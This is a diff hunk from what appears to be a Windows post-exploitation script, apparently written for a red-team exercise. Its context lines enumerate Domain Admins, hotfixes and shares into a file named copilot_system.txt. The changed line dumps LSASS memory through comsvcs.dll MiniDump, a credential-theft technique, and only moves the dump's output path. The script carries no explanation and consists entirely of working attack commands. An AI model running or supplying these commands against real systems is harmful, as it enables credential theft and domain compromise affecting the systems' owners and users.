@@ -11,4 +11,4 @@ net group "Domain Admins" /domain  >> "C:\TMP\copilot_system.txt"
 wmic qfe list full >> "C:\TMP\copilot_system.txt"
 wmic share get >> "C:\TMP\copilot_system.txt"
 
-powershell.exe -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID '$((get-process lsass).id)'  C:\Users\cladmin\Desktop\tatbikat\lsass.dmp full" ; echo nul > C:\Users\cladmin\Desktop\tatbikat\lsass.dmp
+powershell.exe -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID '$((get-process lsass).id)'  C:\Tmp\lsass.dmp full" ; echo nul > C:\Tmp\lsass.dmp
